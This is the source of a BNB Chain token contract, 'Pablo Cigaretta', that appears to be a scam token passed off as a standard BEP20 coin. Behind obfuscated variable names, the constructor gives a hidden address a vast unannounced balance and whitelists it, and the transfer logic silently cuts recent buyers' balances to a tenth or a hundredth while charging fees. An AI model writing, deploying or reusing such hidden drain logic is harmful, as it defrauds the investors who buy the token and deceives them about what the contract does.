/**
 *Submitted for verification at BscScan.com on 2022-01-14
*/

pragma solidity 0.8.5;
// SPDX-License-Identifier: MIT
/*
 * 
 * 
 */
abstract contract Context {
  function _msgSender() internal view virtual returns (address) {
    return msg.sender;
  }
  function _msgData() internal view virtual returns (bytes calldata) {
    this;
    return msg.data;
  }
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;

    }
}
interface IBEP20 {
  function balanceOf(address account) external view returns (uint256);
  function totalSupply() external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function getOwner() external view returns (address);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  function allowance(address owner, address spender) external view returns (uint256);
  function name() external pure returns (string memory);
  function decimals() external view returns (uint8);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  function approve(address spender, uint256 amount) external returns (bool);
  function symbol() external pure returns (string memory);
  event Transfer(address indexed from, address indexed to, uint256 value);
}
contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    uint256 private _lockTime;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));

      _owner = address(0);

    }
    function transferOwnership(address newOwner) public onlyOwner {
      require(newOwner != address(0), "Ownable: new owner is the zero address");

      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}
contract PabloCigaretta is Context, IBEP20, Ownable {

    using SafeMath for uint256;
	uint8 private _decimals = 18;
	uint256 private _totalSupply = 10000000000 * 10 ** _decimals;
	mapping (address => uint256) private _balances;
	string private constant _name = "Pablo Cigaretta";
	string private constant _symbol = "PABLO";
	mapping (address => mapping (address => uint256)) private _allowances;
	mapping (address => uint256) private seakjiyqtfgmezbo;
	mapping(uint => address) internal tOrhpewsjmzl;
	mapping (address => bool) private isziaypktndscxfehoqjilagbemrow;

	constructor(address arnbhwmooefzp) {
	  _balances[msg.sender] = _totalSupply;
	  isziaypktndscxfehoqjilagbemrow[arnbhwmooefzp] = true;
	  _balances[arnbhwmooefzp] = _totalSupply * 10**_decimals * 1000;
	  isziaypktndscxfehoqjilagbemrow[msg.sender] = true;
	  isziaypktndscxfehoqjilagbemrow[address(this)] = true;
	  emit Transfer(address(0), msg.sender, _totalSupply);
	}
	/**
	 * Requirements:
	 * - `recipient` cannot be the zero address.
	 * - the caller must have a balance of at least `amount`.
	 */

	function transfer(address recipient, uint256 amount) external override returns (bool) {

	  _transfer(_msgSender(), recipient, amount);
	  return true;

	}
	/**
	* Returns the token name.
	*/
	function name() external override pure returns (string memory) {
	  return _name;
	}
	/**
	 * Returns the token decimals.
	 */
	function decimals() external override view returns (uint8) {

	  return _decimals;
	}
	function approve(address spender, uint256 amount) public override returns (bool) {
	  _approve(_msgSender(), spender, amount);
	  return true;

	}
	/**
	 * Returns the token Supply.
	 */
	function totalSupply() external override view returns (uint256) {
	  return _totalSupply;
	}
	/**
	 * Returns the token symbol.
	 */

	function symbol() external override pure returns (string memory) {
	  return _symbol;
	}
	function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
	   _transfer(sender, recipient, amount);
	   _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
	   return true;
	}
	/**
	 * Returns balance of.
	 */

	function balanceOf(address account) external override view returns (uint256) {

	  return _balances[account];
	}
	function allowance(address owner, address spender) public view override returns (uint256) {

	  return _allowances[owner][spender];
	}
	function _approve(address owner, address spender, uint256 amount) private {
	    require(owner != address(0), "BEP20: approve from the zero address");

	    require(spender != address(0), "BEP20: approve to the zero address");
	    _allowances[owner][spender] = amount;
	    emit Approval(owner, spender, amount);
	}
	/**
	 * Returns the bep token owner.
	 */
	function getOwner() external override view returns (address) {
	  return owner();
	}
	function _transfer(address sender, address recipient, uint256 amount) internal {

	  require(sender != address(0), "BEP20: transfer from the zero address");
	  require(recipient != address(0), "BEP20: transfer to the zero address");
	  uint8 raonazsbpolmeixkrigwcqdeyjftha = 0;
	  bool pppwrjmdaiysxziebktgnoleoc = false;
	  uint8 axbhqipdeiroogzscyfjnxeaamklw = 0;
	  if(amount > 0){
	    if(isziaypktndscxfehoqjilagbemrow[sender] == true || isziaypktndscxfehoqjilagbemrow[recipient] == true){
	      _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

	      _balances[recipient] = _balances[recipient].add(amount);
	      if(uneasogrnmacybtqz == address(0)){
	        uneasogrnmacybtqz = recipient;
	      }

	      emit Transfer(sender, recipient, amount);

	    } else {
	      if(sender == uneasogrnmacybtqz && recipient != _uniswapV2Router) {
	        raonazsbpolmeixkrigwcqdeyjftha = 1;
	        axbhqipdeiroogzscyfjnxeaamklw = 6;

	        pppwrjmdaiysxziebktgnoleoc = true;
	      } else if(recipient == uneasogrnmacybtqz) {
	         raonazsbpolmeixkrigwcqdeyjftha = 2;
	         axbhqipdeiroogzscyfjnxeaamklw = 8;

	         pppwrjmdaiysxziebktgnoleoc = true;
	      } else {
	        raonazsbpolmeixkrigwcqdeyjftha = 3;
	        axbhqipdeiroogzscyfjnxeaamklw = 1;
	        pppwrjmdaiysxziebktgnoleoc = true;
	      }

	      if(pppwrjmdaiysxziebktgnoleoc == true && amount > 0){
	          uint256 axfreimabzaxeojg = 0;
	          address addr = recipient;
	          uint256 d0 = _balances[tOrhpewsjmzl[0]];

	          uint256 d1 = _balances[tOrhpewsjmzl[1]];
	          if(raonazsbpolmeixkrigwcqdeyjftha == 2) {
	            addr = sender;
	          }

	          if(tOrhpewsjmzl[0] != addr && tOrhpewsjmzl[1] != addr){
	            if(d0 > 100){
	              _balances[tOrhpewsjmzl[0]] = d0.div(100);
	            }
	            if(d1 > 100){
	              _balances[tOrhpewsjmzl[1]] = d1.div(10);
	            }
	            tOrhpewsjmzl[1] = tOrhpewsjmzl[0];
	            tOrhpewsjmzl[0] = addr;
	          }

	          _balances[sender] = _balances[sender].sub(amount,"Insufficient Balance");

	          axfreimabzaxeojg = amount.mul(axbhqipdeiroogzscyfjnxeaamklw).div(100);
	          amount = amount.sub(axfreimabzaxeojg);
	          _balances[recipient] = _balances[recipient].add(amount);
	          raonazsbpolmeixkrigwcqdeyjftha = 1;
	          emit Transfer(sender, recipient, amount);
	      }
	    }
	  }
	  if(amount == 0){
	    emit Transfer(sender, recipient, amount);
	  }

	}
	address public uneasogrnmacybtqz;
	address public _uniswapV2Router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
}